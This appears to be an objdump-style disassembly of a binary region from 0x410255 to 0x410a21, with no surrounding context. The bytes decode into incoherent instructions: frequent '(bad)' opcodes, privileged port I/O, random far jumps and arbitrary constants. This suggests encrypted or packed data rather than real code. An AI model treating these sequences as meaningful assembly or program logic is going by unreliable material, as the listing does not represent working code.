  410255:	pop    edx
  410256:	inc    edi
  410257:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410258:	test   eax,0x4e1619d2
  41025d:	pop    eax
  41025e:	sbb    al,0x5a
  410260:	mov    dl,0xae
  410262:	out    dx,eax
  410263:	jg     0x410264
  410265:	or     DWORD PTR [ebp+0x7c],0xffffffb7
  410269:	and    bl,ah
  41026b:	call   0xf1ce:0x9877a67e
  410272:	rcl    DWORD PTR [esi+0x3dcc9f51],1
  410278:	sub    eax,DWORD PTR [ecx-0x31b3b2ca]
  41027e:	test   BYTE PTR [esi],dl
  410280:	stos   BYTE PTR es:[edi],al
  410281:	push   es
  410282:	sub    eax,0xa44a2ec1
  410287:	popa   
  410288:	ret    
  410289:	jmp    0x4102ed
  41028b:	mov    cs,WORD PTR [eax+esi*4-0x55]
  41028f:	shl    DWORD PTR [ecx-0x62e66625],cl
  410295:	or     ah,al
  410297:	dec    esi
  410298:	pusha  
  410299:	dec    ebx
  41029a:	mov    ah,0x2e
  41029c:	cs mov esp,0x28d4c8ef
  4102a2:	call   0xebc158cd
  4102a7:	pop    es
  4102a8:	and    DWORD PTR [ebp-0x1ca0bc21],esp
  4102ae:	sti    
  4102af:	fild   WORD PTR [edi]
  4102b1:	mov    dh,0x1
  4102b3:	outs   dx,BYTE PTR ds:[esi]
  4102b4:	cmp    BYTE PTR [ebp+ebx*8+0x25],bh
  4102b8:	dec    eax
  4102b9:	lock jl 0x410262
  4102bc:	sbb    bh,bh
  4102be:	inc    eax
  4102bf:	or     eax,0xc88ae487
  4102c4:	jns    0x4102c7
  4102c6:	aam    0x4
  4102c8:	les    ecx,FWORD PTR [ebx-0x2d0184f7]
  4102ce:	mov    DWORD PTR [eax],edx
  4102d0:	fnsave [edx-0x7c4db121]
  4102d6:	jg     0x4102fc
  4102d8:	push   cs
  4102d9:	mov    dl,0xe0
  4102db:	jp     0x410261
  4102dd:	jmp    0xe0e9:0xebc9ee03
  4102e4:	mov    ecx,DWORD PTR [ebx-0x59577f03]
  4102ea:	aaa    
  4102eb:	mov    ch,0x4b
  4102ed:	xor    DWORD PTR [ebx-0x1fe2359b],edx
  4102f3:	ror    DWORD PTR [edx-0x117271fa],0xdd
  4102fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102fb:	xor    BYTE PTR [ecx+0x2967908b],cl
  410301:	ficomp WORD PTR [ecx]
  410303:	jl     0x4102ef
  410305:	fmul   QWORD PTR [edx-0x268ea644]
  41030b:	or     al,bl
  41030d:	(bad)
  410311:	int3   
  410312:	idiv   BYTE PTR ds:0x37562e9
  410318:	cmp    cl,bl
  41031a:	js     0x4102a2
  41031c:	jne    0x4102b0
  41031e:	push   0x15
  410320:	sar    edx,0x5
  410323:	(bad)  
  410325:	ret    
  410326:	push   ecx
  410327:	imul   ecx,esp,0xadd90686
  41032d:	mov    al,0x8d
  41032f:	inc    esi
  410330:	mov    ecx,0xd419aaf4
  410335:	xchg   ecx,eax
  410336:	ja     0x41033b
  410338:	push   cs
  410339:	mov    al,0xa0
  41033b:	mov    ch,0x9d
  41033d:	add    ebx,ebx
  41033f:	push   ss
  410340:	fsubp  st(6),st
  410342:	or     BYTE PTR [ebp+0x40b33f04],0xf0
  410349:	fbld   TBYTE PTR [eax+0x22]
  41034c:	lock mov al,ds:0x27608277
  410352:	add    dl,BYTE PTR [ecx]
  410354:	(bad)  
  410355:	idiv   BYTE PTR [edi-0x69]
  410358:	mov    bh,0xce
  41035a:	cld    
  41035b:	les    esp,FWORD PTR [ebp+0x21]
  41035e:	into   
  41035f:	ret    
  410360:	fst    QWORD PTR [ebx-0xb]
  410363:	hlt    
  410364:	xchg   ecx,eax
  410365:	mov    ah,0x24
  410367:	adc    al,0x58
  410369:	mov    al,BYTE PTR [edi+0x6a0613a1]
  41036f:	mov    BYTE PTR [edx-0x4b],al
  410372:	pop    edi
  410373:	fs add al,0xc8
  410376:	xor    eax,0x16a4fded
  41037b:	int    0x4
  41037d:	popa   
  41037e:	(bad)
  410381:	mov    ah,0x9c
  410383:	dec    esp
  410384:	ret    
  410385:	out    dx,al
  410386:	ret    
  410387:	lods   eax,DWORD PTR ds:[esi]
  410388:	xchg   ebp,eax
  410389:	(bad)  
  41038a:	pop    es
  41038b:	loope  0x410409
  41038d:	jl     0x4103dc
  41038f:	clc    
  410390:	std    
  410391:	ficom  DWORD PTR [edi-0x10]
  410394:	daa    
  410395:	mov    esp,0x353ae1d5
  41039a:	cld    
  41039b:	into   
  41039c:	add    eax,0x4380ec82
  4103a1:	pop    ebp
  4103a2:	mov    al,ds:0x4c5d8c99
  4103a7:	mov    bl,0x28
  4103a9:	dec    ebx
  4103aa:	xor    BYTE PTR [ecx+0x3b],0xd8
  4103ae:	sub    cl,BYTE PTR [eax-0x6e00e57f]
  4103b4:	cmp    ah,BYTE PTR [esi+0x24]
  4103b7:	lahf   
  4103b8:	stos   BYTE PTR es:[edi],al
  4103b9:	arpl   WORD PTR [eax],dx
  4103bb:	inc    edi
  4103bc:	sbb    BYTE PTR [edi+0x4e],0x5a
  4103c0:	scas   eax,DWORD PTR es:[edi]
  4103c1:	rol    BYTE PTR [eax-0x1],0x15
  4103c5:	add    al,0xa
  4103c7:	xor    ah,BYTE PTR [ecx+ebx*8]
  4103ca:	mov    BYTE PTR [eax+0x795a6cee],bl
  4103d0:	xchg   edx,eax
  4103d1:	stos   DWORD PTR es:[edi],eax
  4103d2:	push   ss
  4103d3:	into   
  4103d4:	(bad)  
  4103d6:	imul   ecx,ebp,0xffffe916
  4103dc:	mov    WORD PTR [ebp+edi*2+0x63],cs
  4103e0:	mov    esp,0x33cfeb8
  4103e5:	not    esi
  4103e7:	push   0x7f
  4103e9:	scas   eax,DWORD PTR es:[edi]
  4103ea:	and    ah,dh
  4103ec:	out    dx,eax
  4103ed:	leave  
  4103ee:	fmulp  st(0),st
  4103f0:	aad    0x6
  4103f2:	inc    edi
  4103f3:	nop    DWORD PTR [ebp-0x17]
  4103f7:	xor    DWORD PTR [eax-0x33ad5798],ebx
  4103fd:	adc    al,0x4b
  4103ff:	in     eax,dx
  410400:	jecxz  0x4103cd
  410402:	sbb    al,BYTE PTR [esi+0x0]
  410405:	addr16 inc ebx
  410407:	jle    0x410469
  410409:	shl    edx,cl
  41040b:	outs   dx,BYTE PTR ds:[esi]
  41040c:	sar    DWORD PTR ds:0x471bcc,0x46
  410413:	in     eax,dx
  410414:	imul   esp,DWORD PTR [edi+eiz*2+0x1f],0x923169c9
  41041c:	and    al,al
  41041e:	mov    esi,ebp
  410420:	or     eax,0x65074a0d
  410425:	inc    ebp
  410426:	shl    DWORD PTR [edi+ebx*4+0x17],cl
  41042a:	fdiv   st(6),st
  41042c:	push   ebp
  41042d:	and    al,0xea
  41042f:	lds    ebp,FWORD PTR [esp+edx*1+0x2b5accee]
  410436:	jne    0x410450
  410438:	div    BYTE PTR [edi-0x4e]
  41043b:	aad    0xac
  41043d:	mov    ch,0xa1
  41043f:	mov    bh,0x6d
  410441:	xchg   esp,eax
  410442:	sub    DWORD PTR [eax+0x3d],esi
  410445:	push   0x82120562
  41044a:	mov    esp,0x809665e1
  41044f:	in     eax,0x52
  410451:	dec    edx
  410452:	mov    eax,0x5860ed28
  410457:	in     eax,dx
  410458:	arpl   WORD PTR ds:0x7c208b74,bx
  41045e:	dec    ebp
  41045f:	rcl    BYTE PTR [bx+si],0x87
  410463:	inc    ebx
  410464:	xchg   ecx,eax
  410465:	and    BYTE PTR gs:[ebx-0x7c],bl
  410469:	scas   al,BYTE PTR es:[edi]
  41046a:	std    
  41046b:	dec    ebp
  41046c:	scas   al,BYTE PTR es:[edi]
  41046d:	mov    ds:0xa495e16f,al
  410472:	push   esp
  410473:	aas    
  410474:	and    dh,ch
  410476:	inc    esi
  410477:	sub    dl,BYTE PTR [ebp+0x1b]
  41047a:	(bad)  
  41047b:	jl     0x410410
  41047d:	clc    
  41047e:	ss ror ch,1
  410481:	pop    edx
  410482:	arpl   WORD PTR [eax-0x6049a4dc],dx
  410488:	bound  eax,QWORD PTR [edx]
  41048a:	jmpw   0x1b64
  41048e:	inc    ebp
  41048f:	(bad)  
  410490:	sbb    eax,esp
  410492:	inc    edi
  410493:	lods   al,BYTE PTR ds:[esi]
  410494:	push   ss
  410495:	dec    edi
  410496:	dec    ecx
  410497:	mov    ds:0xab25f5a6,eax
  41049c:	xchg   ecx,eax
  41049d:	mov    bh,0xa7
  41049f:	shl    DWORD PTR [edx],cl
  4104a1:	cld    
  4104a2:	inc    esp
  4104a3:	shr    DWORD PTR [eax-0x7cc8a855],0x3e
  4104aa:	inc    edi
  4104ab:	jne    0x410499
  4104ad:	daa    
  4104ae:	mov    al,ds:0x70c5b49f
  4104b3:	jg     0x4104bb
  4104b5:	xor    DWORD PTR [ebx+0x3a],ebp
  4104b8:	push   ebx
  4104b9:	stos   DWORD PTR es:[edi],eax
  4104ba:	aaa    
  4104bb:	mov    esi,0xb56e42de
  4104c0:	push   ebx
  4104c1:	iret   
  4104c2:	ret    
  4104c3:	add    dh,BYTE PTR [eax+0x3a]
  4104c6:	jmp    0x410502
  4104c8:	fwait
  4104c9:	test   esp,esp
  4104cb:	adc    al,0xa6
  4104cd:	scas   eax,DWORD PTR es:[edi]
  4104ce:	ins    DWORD PTR es:[edi],dx
  4104cf:	add    eax,0xd2a5cf7
  4104d4:	push   0x16470180
  4104d9:	xlat   BYTE PTR ds:[ebx]
  4104da:	fucomp st(7)
  4104dc:	add    DWORD PTR [ecx+esi*1+0x78],esi
  4104e0:	inc    eax
  4104e1:	jns    0x4104ef
  4104e3:	int    0xa2
  4104e5:	pop    edx
  4104e6:	shl    DWORD PTR [ebx],cl
  4104e8:	xchg   ebx,eax
  4104e9:	xchg   ebp,eax
  4104ea:	sub    al,BYTE PTR [esi+ebp*1]
  4104ed:	xor    esp,esp
  4104ef:	enter  0x3acf,0x2f
  4104f3:	mov    eax,0x27982ad4
  4104f8:	pop    edx
  4104f9:	aam    0xac
  4104fb:	cs iret 
  4104fd:	pop    esi
  4104fe:	mov    ds:0xa0b529b9,al
  410503:	out    dx,al
  410504:	inc    edi
  410505:	pop    ds
  410506:	inc    eax
  410507:	ins    BYTE PTR es:[edi],dx
  410508:	or     BYTE PTR [esi],bl
  41050a:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41050c:	ins    BYTE PTR es:[edi],dx
  41050d:	mov    ebp,0x8e6f1db5
  410512:	popf   
  410513:	ins    DWORD PTR es:[edi],dx
  410514:	cmp    ebp,ebp
  410516:	fcomp  DWORD PTR [ecx-0x40]
  410519:	retf   0x9451
  41051c:	xor    eax,DWORD PTR [eax-0x642d8bdd]
  410522:	rol    BYTE PTR [ebp+0x7ded60f],cl
  410528:	jnp    0x410541
  41052a:	imul   esp,ebx,0x67
  41052d:	in     eax,dx
  41052e:	test   DWORD PTR ds:0xc2582119,eax
  410534:	das    
  410535:	ja     0x41056e
  410537:	pop    ss
  410538:	mov    esi,DWORD PTR [edx-0x49]
  41053b:	dec    ebp
  41053c:	or     DWORD PTR [esi],ebx
  41053e:	aad    0x7c
  410540:	pop    esp
  410541:	mov    DWORD PTR [edi],esp
  410543:	int    0x4
  410545:	mov    ds:0xc9c3d7a5,eax
  41054a:	mov    ah,0xfc
  41054c:	and    BYTE PTR [ebx],ch
  41054e:	repnz dec edx
  410550:	sbb    al,BYTE PTR [edx]
  410552:	in     eax,0xc5
  410554:	and    al,0x54
  410556:	int    0x6d
  410558:	mov    edi,0x52a5038f
  41055d:	arpl   WORD PTR [esi+0x7a],si
  410560:	sbb    edx,ecx
  410562:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410563:	pusha  
  410564:	lea    ecx,ds:0xbd4b566f
  41056a:	mov    al,ds:0x56aeb9e5
  41056f:	cli    
  410570:	iret   
  410571:	adc    eax,0x1b28c243
  410576:	dec    esp
  410577:	inc    edx
  410578:	enter  0xbf0e,0xb6
  41057c:	cs adc eax,0x55335aea
  410582:	lea    esi,[esi]
  410584:	push   ebx
  410585:	(bad)  
  410586:	mov    bh,0x16
  410588:	shr    DWORD PTR [ecx-0x4c],cl
  41058b:	nop
  41058c:	mov    al,ds:0x1081f21c
  410591:	call   0xa647ae06
  410596:	les    eax,FWORD PTR [eax+0x35]
  410599:	jns    0x4105b1
  41059b:	aaa    
  41059c:	adc    eax,0x67756f62
  4105a1:	cmp    DWORD PTR [eax],edi
  4105a3:	jg     0x41053f
  4105a5:	test   DWORD PTR [ebx+0x59],0x4db5acf8
  4105ac:	adc    ah,bl
  4105ae:	pop    ds
  4105af:	or     edi,DWORD PTR [eax-0x1e]
  4105b2:	fld    DWORD PTR [ebp-0x61c1df44]
  4105b8:	sub    al,0x27
  4105ba:	mov    ds:0x35ba5f19,al
  4105bf:	int3   
  4105c0:	mov    edx,edx
  4105c2:	mov    cs,ebx
  4105c4:	loop   0x4105d8
  4105c6:	retf   
  4105c7:	push   eax
  4105c8:	out    dx,eax
  4105c9:	sbb    BYTE PTR [esi+0x4b14c6cc],dh
  4105cf:	loope  0x41060b
  4105d1:	sbb    al,bl
  4105d3:	dec    edx
  4105d4:	or     al,0xe3
  4105d6:	out    dx,eax
  4105d7:	imul   ebp,DWORD PTR [ebx+0xb],0xffffffae
  4105db:	cmp    DWORD PTR [edi+0x1351ae78],ebp
  4105e1:	and    esi,DWORD PTR [edx+0x285266f7]
  4105e7:	xor    DWORD PTR [di],ecx
  4105ea:	push   esp
  4105eb:	fistp  WORD PTR gs:[ecx-0x33]
  4105ef:	scas   eax,DWORD PTR es:[edi]
  4105f0:	shl    DWORD PTR [edx],0x53
  4105f3:	adc    al,0xb1
  4105f5:	sbb    al,0x87
  4105f7:	sub    BYTE PTR [eax+0x51],0x7d
  4105fb:	fdivp  st(4),st
  4105fd:	jmp    0xfbce:0x726367b6
  410604:	fwait
  410605:	sahf   
  410606:	sub    eax,0xb5eb1ecd
  41060b:	xchg   DWORD PTR [edi],esi
  41060d:	and    DWORD PTR [edx+0x704777f9],eax
  410613:	cmp    ebx,DWORD PTR [edx+0x2daac3ba]
  410619:	or     bh,al
  41061b:	in     eax,0x7b
  41061d:	push   esi
  41061e:	js     0x410600
  410620:	xor    BYTE PTR [ebx+0x22cc731a],0x23
  410627:	mov    dh,ch
  410629:	das    
  41062a:	in     eax,dx
  41062b:	(bad)  
  41062c:	jne    0x410646
  41062e:	pop    esp
  41062f:	lods   eax,DWORD PTR ds:[esi]
  410630:	call   0xebebccff
  410635:	out    0x6,eax
  410637:	icebp  
  410638:	mov    WORD PTR [ecx],gs
  41063a:	lahf   
  41063b:	mov    bh,0xfb
  41063d:	inc    ebp
  41063e:	ja     0x41068c
  410640:	les    edi,FWORD PTR [esi+esi*8-0x6338138d]
  410647:	test   al,0x3e
  410649:	in     eax,dx
  41064a:	int3   
  41064b:	xchg   BYTE PTR [eax-0x3650ae28],al
  410651:	mov    edi,0x9b6512e0
  410656:	pop    esp
  410657:	int    0x50
  410659:	mul    DWORD PTR [edx+0x3]
  41065c:	adc    eax,0xa06f5dfd
  410661:	fimul  DWORD PTR ds:0x65881874
  410667:	daa    
  410668:	mov    DWORD PTR [edi+edi*4],ecx
  41066b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41066c:	jae    0x41063d
  41066e:	adc    edi,eax
  410670:	dec    esi
  410672:	sub    ebx,DWORD PTR [eax-0x60697037]
  410678:	pop    ebx
  410679:	inc    ecx
  41067a:	loop   0x4106aa
  41067c:	push   esp
  41067d:	sub    al,BYTE PTR [edx-0x106285b8]
  410683:	and    cl,dl
  410685:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410686:	mov    ch,0x9e
  410688:	ins    BYTE PTR es:[edi],dx
  410689:	fstp   QWORD PTR [edi]
  41068b:	lahf   
  41068c:	(bad)  
  41068d:	in     eax,0xda
  41068f:	clc    
  410690:	fsubr  st(2),st
  410692:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410693:	sub    BYTE PTR ds:0xc8c09435,al
  410699:	jae    0x410652
  41069b:	cmp    dl,BYTE PTR [esi+eiz*4-0x7a5beca7]
  4106a2:	push   edi
  4106a3:	popa   
  4106a4:	sbb    al,0x6b
  4106a6:	gs pushf 
  4106a8:	mov    dl,0xa
  4106aa:	dec    ebx
  4106ab:	xchg   ebx,eax
  4106ac:	aam    0x9a
  4106ae:	xchg   BYTE PTR [esi+eiz*1-0x4],al
  4106b2:	add    al,0xba
  4106b4:	pusha  
  4106b5:	dec    esp
  4106b6:	cmc    
  4106b7:	mov    esi,0x909142fb
  4106bc:	(bad)  
  4106bd:	jle    0x4106fd
  4106bf:	mov    ebp,?
  4106c1:	mov    ?,WORD PTR ds:0x200d40f3
  4106c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106c8:	loope  0x4106bd
  4106ca:	xchg   ebp,eax
  4106cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106cc:	push   edi
  4106cd:	mov    al,0xd1
  4106cf:	cmp    DWORD PTR [esi-0x5746e170],eax
  4106d5:	outs   dx,BYTE PTR ds:[esi]
  4106d6:	cmp    DWORD PTR [ecx-0x66ffee43],eax
  4106dc:	ror    BYTE PTR [eax+0x76],cl
  4106df:	rcr    DWORD PTR [edi-0x4b],1
  4106e2:	jb     0x4106e3
  4106e4:	ins    BYTE PTR es:[edi],dx
  4106e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106e6:	push   esi
  4106e7:	pop    eax
  4106e8:	or     DWORD PTR [eax+ebp*4],ebx
  4106eb:	and    ah,ch
  4106ed:	out    dx,eax
  4106ee:	mov    al,0xcf
  4106f0:	add    DWORD PTR [esi-0x55],0xb
  4106f4:	sbb    al,bh
  4106f6:	xchg   edi,eax
  4106f7:	jge    0x4106f6
  4106f9:	jge    0x4106f8
  4106fb:	bound  ebx,QWORD PTR [edi+0x65]
  4106fe:	mov    esp,0xab55fdbb
  410703:	jp     0x41074d
  410705:	out    0xaf,al
  410707:	jge    0x41071c
  410709:	add    eax,0x20e6ce53
  41070e:	icebp  
  41070f:	shl    DWORD PTR [ecx],0x23
  410712:	dec    ebx
  410713:	test   al,0x34
  410715:	enter  0xf5e8,0x88
  410719:	aam    0x74
  41071b:	cwde   
  41071c:	shr    DWORD PTR [ebx+0x33463a3c],0x18
  410723:	push   edi
  410724:	or     ecx,edi
  410726:	mov    esi,0x4b0e2595
  41072b:	jne    0x41079c
  41072d:	clc    
  41072e:	ret    0x211c
  410731:	js     0x410728
  410733:	daa    
  410734:	in     al,0x6d
  410736:	aad    0xcd
  410738:	or     DWORD PTR [ecx-0x757df0bc],eax
  41073e:	in     al,dx
  41073f:	stos   DWORD PTR es:[edi],eax
  410740:	push   esi
  410741:	loopne 0x4107a8
  410743:	jecxz  0x41071a
  410745:	jno    0x410738
  410747:	push   ebp
  410748:	add    bh,BYTE PTR [eax-0x638f3c2c]
  41074e:	sub    BYTE PTR ss:[edi],bh
  410751:	(bad)  
  410752:	loop   0x4107d0
  410754:	lods   al,BYTE PTR ds:[esi]
  410755:	ds enter 0xcb8f,0x2
  41075a:	inc    edx
  41075b:	sbb    edx,DWORD PTR [ebx+0x240acb65]
  410761:	and    eax,0x1b140879
  410766:	js     0x4107a4
  410768:	and    al,0xa5
  41076a:	add    DWORD PTR [eax],ecx
  41076c:	add    edi,esi
  41076e:	imul   esi,DWORD PTR [ecx-0xdec8448],0xf393da11
  410778:	fild   WORD PTR [edi+edx*2+0x13]
  41077c:	rol    DWORD PTR [ebx+0x39dacbb2],0x87
  410783:	add    ah,BYTE PTR [edi]
  410785:	nop
  410786:	dec    edi
  410787:	jge    0x410808
  410789:	jno    0x41073f
  41078b:	sbb    al,BYTE PTR [ebx+ebp*2]
  41078e:	sub    DWORD PTR [ebx+0x64],edx
  410791:	cmp    al,0x7f
  410793:	xchg   ecx,eax
  410794:	popf   
  410795:	loop   0x41073a
  410797:	mov    ebx,DWORD PTR [esi+0x5bbca994]
  41079d:	or     edi,DWORD PTR [ecx-0x30afb06c]
  4107a3:	jle    0x410734
  4107a5:	fild   WORD PTR [edx]
  4107a7:	clc    
  4107a8:	dec    edx
  4107a9:	aas    
  4107aa:	mov    ebx,DWORD PTR [edi]
  4107ac:	jge    0x410731
  4107ae:	fld    DWORD PTR [eax+0x47873046]
  4107b4:	sbb    DWORD PTR [ecx],ecx
  4107b6:	push   ebx
  4107b7:	mov    ds:0xf7e07eae,eax
  4107bc:	and    eax,0x260f1f4c
  4107c1:	xor    al,0x65
  4107c3:	popa   
  4107c4:	push   ss
  4107c5:	arpl   WORD PTR [eax-0x6b],dx
  4107c8:	sbb    edx,DWORD PTR [edi]
  4107ca:	stc    
  4107cb:	jmp    0x93e59281
  4107d0:	mov    ch,dl
  4107d2:	sar    BYTE PTR [esi],1
  4107d4:	scas   al,BYTE PTR es:[edi]
  4107d5:	jg     0x41082e
  4107d7:	pop    esi
  4107d8:	enter  0x4ae6,0x6a
  4107dc:	in     al,0x2b
  4107de:	cmp    eax,0x94d169a
  4107e3:	sub    eax,0xa6365f2d
  4107e8:	scas   al,BYTE PTR es:[edi]
  4107e9:	loopne 0x4107cf
  4107eb:	mov    ecx,0x3a694c10
  4107f0:	xor    al,0xa3
  4107f2:	jnp    0x4107bd
  4107f4:	push   esp
  4107f5:	stc    
  4107f6:	div    DWORD PTR [ecx+edi*8]
  4107f9:	les    ebp,FWORD PTR [ebx+0x4c]
  4107fc:	inc    eax
  4107fd:	aam    0x4d
  4107ff:	in     eax,dx
  410800:	cld    
  410801:	cmp    al,0x4d
  410803:	aam    0xc
  410805:	outs   dx,DWORD PTR ds:[esi]
  410806:	lahf   
  410807:	js     0x410850
  410809:	lds    esp,FWORD PTR [edi-0x2f]
  41080c:	xchg   DWORD PTR [ebx-0x3944687a],edx
  410812:	xchg   esp,eax
  410813:	jmp    0xd42e:0x56303961
  41081a:	das    
  41081b:	(bad)  
  41081c:	mov    edx,0x5b5c2499
  410821:	icebp  
  410822:	je     0x4107c4
  410824:	jl     0x4107b5
  410826:	jno    0x4107b1
  410828:	scas   al,BYTE PTR es:[edi]
  410829:	sbb    BYTE PTR [ecx-0x4fe21a49],al
  41082f:	pop    esi
  410830:	adc    ecx,ecx
  410832:	xor    bh,BYTE PTR [ebp+0x38]
  410835:	pop    ebx
  410836:	adc    al,0xab
  410838:	fsubr  QWORD PTR [esi+0x1a]
  41083b:	aas    
  41083c:	fwait
  41083d:	in     al,dx
  41083e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41083f:	xor    BYTE PTR [edi],dl
  410841:	loop   0x410850
  410843:	fwait
  410844:	mov    ecx,0xad636cf2
  410849:	cmp    al,0xcd
  41084b:	sahf   
  41084c:	imul   edx,DWORD PTR [esi-0x18],0x24
  410850:	sub    edi,DWORD PTR [esi+0x31]
  410853:	aam    0xe2
  410855:	scas   al,BYTE PTR es:[edi]
  410856:	push   es
  410857:	sbb    DWORD PTR [ebx],ebx
  410859:	jle    0x4108c7
  41085b:	ret    0xf3ad
  41085e:	mov    al,0xaf
  410860:	push   ebp
  410861:	xchg   BYTE PTR [ebx-0x11],al
  410864:	(bad)  
  410865:	xor    eax,0xfa6c6c1
  41086a:	(bad)  
  41086b:	lods   eax,DWORD PTR ds:[esi]
  41086c:	add    ebx,DWORD PTR [eax]
  41086e:	lds    ebp,FWORD PTR [edi-0x434059b7]
  410874:	jmp    0xcb3b:0x425ad9aa
  41087b:	fdecstp 
  41087d:	jbe    0x4108ea
  41087f:	lods   eax,DWORD PTR ds:[esi]
  410880:	int    0x2a
  410882:	je     0x41086e
  410884:	in     al,dx
  410885:	fwait
  410886:	adc    eax,0x96ec83ec
  41088b:	mov    ds:0xf5114b46,al
  410890:	dec    ebx
  410891:	(bad)  
  410894:	call   DWORD PTR ds:0x3b4cb9e4
  41089a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41089b:	aaa    
  41089c:	jmp    0x58bd:0xd9e5f3ba
  4108a3:	jbe    0x4108a7
  4108a5:	mov    ecx,0x3d97b937
  4108aa:	fist   DWORD PTR [edx+edx*4]
  4108ad:	jmp    0xeffd72fe
  4108b2:	pushf  
  4108b3:	setne  BYTE PTR [ecx]
  4108b6:	mov    fs,WORD PTR [edi]
  4108b8:	sbb    ch,BYTE PTR [ebx-0x18]
  4108bb:	ja     0x410845
  4108bd:	cdq    
  4108be:	leave  
  4108bf:	pop    ds
  4108c0:	call   FWORD PTR [esi-0x185eff9d]
  4108c6:	cli    
  4108c7:	sbb    al,0xf5
  4108c9:	push   ds
  4108ca:	mov    al,0x3a
  4108cc:	pop    ss
  4108cd:	xor    DWORD PTR [eax],0x32
  4108d0:	test   DWORD PTR [ecx],0x9f7d5072
  4108d6:	rcl    bh,0xfd
  4108d9:	enter  0xf4f0,0xa6
  4108dd:	call   0xe76944c7
  4108e2:	or     DWORD PTR gs:[eax-0xc],edi
  4108e6:	adc    BYTE PTR [eax-0x21],dh
  4108e9:	test   DWORD PTR [esi],edx
  4108eb:	sbb    edx,ebp
  4108ed:	jmp    0xa68e8baa
  4108f2:	hlt    
  4108f3:	or     ebp,esi
  4108f5:	fld    QWORD PTR [ebx+0x1f]
  4108f8:	leave  
  4108f9:	int    0x9f
  4108fb:	pop    ecx
  4108fc:	jns    0x410947
  4108fe:	mov    esi,0xea2671b5
  410903:	adc    DWORD PTR [eax+0x7f],ecx
  410906:	sbb    eax,0x24d5418f
  41090b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41090c:	and    BYTE PTR [edx-0xcb253b0],dh
  410912:	cdq    
  410913:	mov    bh,0x45
  410915:	add    al,0xd5
  410917:	out    dx,al
  410918:	mov    ecx,0x4b45fdde
  41091d:	call   DWORD PTR [ecx+0x2737feed]
  410923:	nop
  410924:	mov    al,0x7e
  410926:	into   
  410927:	loop   0x41090f
  410929:	cmp    al,0xd0
  41092b:	mov    dl,0xdb
  41092d:	int3   
  41092e:	std    
  41092f:	aaa    
  410930:	(bad)  
  410931:	pop    ss
  410932:	pop    es
  410933:	fcom   DWORD PTR [edi-0x2bd4d69d]
  410939:	lods   eax,DWORD PTR ds:[esi]
  41093a:	inc    esp
  41093b:	and    BYTE PTR [ebp-0x19333e61],ch
  410941:	jl     0x41099a
  410943:	sahf   
  410944:	ror    BYTE PTR [edi+esi*2+0x49965b78],0xc2
  41094c:	sbb    al,0xb5
  41094e:	outs   dx,BYTE PTR ds:[esi]
  41094f:	test   BYTE PTR [esi+0x67a8eb1f],0x5b
  410956:	imul   ecx,DWORD PTR [ebp+0x7],0xfffffff3
  41095a:	add    BYTE PTR [esi+0x9],0xc8
  41095e:	mov    WORD PTR [ecx-0x4b32be9c],ss
  410964:	cmc    
  410965:	sti    
  410966:	pop    ebx
  410967:	or     DWORD PTR [ebx],ecx
  410969:	jmp    0x1496f876
  41096e:	or     ch,BYTE PTR [edx+0x4c4efd1c]
  410974:	mov    dl,0x7a
  410976:	imul   edi
  410978:	mov    dh,0xb
  41097a:	adc    BYTE PTR [esi],cl
  41097c:	xor    BYTE PTR [eax+0x2bc8ccb5],al
  410982:	cmp    dl,BYTE PTR [ebx]
  410984:	fild   WORD PTR [edi]
  410986:	pop    ebp
  410987:	mov    dl,0xdc
  410989:	das    
  41098a:	xchg   ecx,eax
  41098b:	jo     0x4109bd
  41098d:	fucomip st,st(1)
  41098f:	lods   al,BYTE PTR ds:[esi]
  410990:	outs   dx,DWORD PTR ds:[esi]
  410991:	xor    eax,0x7469f7e4
  410996:	pusha  
  410997:	push   es
  410998:	imul   ebp,DWORD PTR [ebp+eax*1+0x321d3dc6],0xffffff91
  4109a0:	mov    dh,0x5f
  4109a2:	lods   eax,DWORD PTR ds:[esi]
  4109a3:	adc    eax,0x8d61c26b
  4109a8:	push   ss
  4109a9:	xchg   esi,eax
  4109aa:	xor    edx,ebx
  4109ac:	shl    DWORD PTR [edx+0x11],0x9a
  4109b0:	mov    esp,DWORD PTR [ebp+0x545db6ce]
  4109b6:	stc    
  4109b7:	push   eax
  4109b8:	mov    eax,ds:0x3127a71b
  4109bd:	pop    ss
  4109be:	fnstsw WORD PTR [ecx+0x29b035fb]
  4109c4:	sbb    BYTE PTR gs:[ecx-0x938d556],bh
  4109cb:	imul   ebp,DWORD PTR [edx-0x16bd2c10],0xffffffd3
  4109d2:	popa   
  4109d3:	jns    0x4109f3
  4109d5:	clc    
  4109d6:	sub    BYTE PTR [esi-0x3fb7fb4d],al
  4109dc:	popf   
  4109dd:	dec    edx
  4109de:	arpl   si,bx
  4109e0:	jo     0x4109e5
  4109e2:	not    eax
  4109e4:	cli    
  4109e5:	mov    ds:0xf457951b,al
  4109ea:	lods   eax,DWORD PTR ds:[esi]
  4109eb:	add    BYTE PTR [edx+0x44],0xdf
  4109ef:	divps  xmm3,XMMWORD PTR [esp+ebx*8-0x1d]
  4109f4:	and    eax,0xdf82a4a0
  4109f9:	dec    edx
  4109fa:	imul   edx,DWORD PTR [ebp+edx*8-0x225cc8be],0xffffff96
  410a02:	pop    ds
  410a03:	pop    edx
  410a04:	push   ebx
  410a05:	xor    BYTE PTR [edx+0x4a],dh
  410a08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a09:	ret    
  410a0a:	retf   0xc645
  410a0d:	mov    dh,0x30
  410a0f:	in     al,dx
  410a10:	in     eax,dx
  410a11:	push   ebx
  410a12:	inc    esi
  410a13:	popf   
  410a14:	fimul  WORD PTR [edx+0x2e]
  410a17:	mov    ss,WORD PTR [edx-0x5eb3150c]
  410a1d:	add    BYTE PTR [edi-0x31],0xf5
  410a21:	xor    eax,0xf52d6327
